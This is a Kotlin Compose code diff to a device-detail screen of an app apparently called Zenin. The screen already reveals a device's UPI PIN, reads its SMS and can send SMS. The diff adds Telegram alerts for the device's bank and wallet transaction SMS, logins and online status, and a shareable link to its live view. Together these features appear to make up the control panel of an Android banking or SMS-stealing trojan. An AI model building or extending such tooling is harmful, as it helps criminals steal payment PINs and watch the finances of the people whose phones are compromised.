@@ -138,12 +138,26 @@ fun DeviceDetailScreen(
                     device = state.device ?: device,
                     upiPin = state.upiPin,
                     isLoadingUpi = state.isLoadingUpi,
+                    notifySettings = state.notifySettings,
                     onRevealUpi = { vm.revealUpiPin() },
-                    onEditNote = { showNoteEditor = true }
+                    onEditNote = { showNoteEditor = true },
+                    onToggleNotify = { kind, enabled -> vm.toggleNotify(kind, enabled) },
+                    onShare = { vm.shareDevice() }
                 )
                 1 -> SmsTab(messages = state.smsMessages, isLoading = state.isLoadingSms, onRefresh = { vm.loadSms() })
             }
         }
+    }
+
+    val shareContext = androidx.compose.ui.platform.LocalContext.current
+    LaunchedEffect(state.shareLink) {
+        val link = state.shareLink ?: return@LaunchedEffect
+        val intent = android.content.Intent(android.content.Intent.ACTION_SEND).apply {
+            type = "text/plain"
+            putExtra(android.content.Intent.EXTRA_TEXT, link)
+        }
+        shareContext.startActivity(android.content.Intent.createChooser(intent, "Share device link"))
+        vm.clearShareLink()
     }
 
     if (showSendSms) {
@@ -218,8 +232,11 @@ private fun InfoTab(
     device: Device,
     upiPin: String?,
     isLoadingUpi: Boolean,
+    notifySettings: com.zenin.app.data.NotifySettings?,
     onRevealUpi: () -> Unit,
-    onEditNote: () -> Unit
+    onEditNote: () -> Unit,
+    onToggleNotify: (com.zenin.app.viewmodel.NotifyKind, Boolean) -> Unit,
+    onShare: () -> Unit
 ) {
     LazyColumn(
         modifier = Modifier.fillMaxSize(),
@@ -334,7 +351,56 @@ private fun InfoTab(
                 )
             }
         }
+        item {
+            ZeninCard(modifier = Modifier.fillMaxWidth()) {
+                SectionHeader("TELEGRAM ALERTS")
+                Spacer(Modifier.height(4.dp))
+                Text("Get notified in Telegram for this device",
+                    style = TextStyle(fontFamily = MonoFamily, fontSize = 11.sp, color = OnSurfaceDim))
+                Spacer(Modifier.height(10.dp))
+                val ns = notifySettings
+                if (ns == null) {
+                    Text("Loading…", style = TextStyle(fontFamily = MonoFamily, fontSize = 12.sp, color = OnSurfaceDim))
+                } else {
+                    NotifyToggleRow("Transactions", "Bank / wallet transaction SMS", ns.transaction) {
+                        onToggleNotify(com.zenin.app.viewmodel.NotifyKind.TRANSACTION, it)
+                    }
+                    NotifyToggleRow("Logins", "New sign-ins on this device", ns.login) {
+                        onToggleNotify(com.zenin.app.viewmodel.NotifyKind.LOGIN, it)
+                    }
+                    NotifyToggleRow("Online / Offline", "Device status changes", ns.onlineOffline) {
+                        onToggleNotify(com.zenin.app.viewmodel.NotifyKind.ONLINE_OFFLINE, it)
+                    }
+                }
+            }
+        }
+        item {
+            ZeninCard(modifier = Modifier.fillMaxWidth()) {
+                SectionHeader("SHARE")
+                Spacer(Modifier.height(8.dp))
+                Text("Generate a read-only link to this device's live view.",
+                    style = TextStyle(fontFamily = MonoFamily, fontSize = 11.sp, color = OnSurfaceDim))
+                Spacer(Modifier.height(12.dp))
+                ZeninOutlinedButton(text = "GENERATE SHARE LINK", onClick = onShare,
+                    modifier = Modifier.fillMaxWidth())
+            }
+        }
         item { Spacer(Modifier.height(16.dp)) }
+    }
+}
+
+@Composable
+private fun NotifyToggleRow(title: String, subtitle: String, checked: Boolean, onChange: (Boolean) -> Unit) {
+    Row(
+        modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
+        horizontalArrangement = Arrangement.SpaceBetween,
+        verticalAlignment = Alignment.CenterVertically
+    ) {
+        Column(modifier = Modifier.weight(1f)) {
+            Text(title, style = TextStyle(fontFamily = MonoFamily, fontSize = 13.sp, color = OnSurface))
+            Text(subtitle, style = TextStyle(fontFamily = MonoFamily, fontSize = 10.sp, color = OnSurfaceDim))
+        }
+        Switch(checked = checked, onCheckedChange = onChange)
     }
 }
 
